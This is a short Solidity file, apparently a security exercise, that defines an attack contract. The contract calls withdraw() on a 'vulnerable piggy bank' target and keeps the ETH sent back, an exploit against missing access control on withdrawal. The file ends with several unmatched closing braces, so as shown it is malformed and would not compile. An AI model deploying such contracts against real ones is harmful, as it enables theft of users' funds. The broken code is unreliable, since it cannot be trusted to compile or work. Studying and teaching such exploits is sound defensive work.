// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerablePiggyBank {
        function withdraw() external;
}

contract AttackPiggyBank {
        IVulnerablePiggyBank public target;

            constructor(address _target) {
                        target = IVulnerablePiggyBank(_target);
            }

                // Attack by calling withdraw
                    function attack() external {
                                target.withdraw();
                    }

                        // Receive any ETH sent back
                            receive() external payable {}
}
                    }
            }
}
}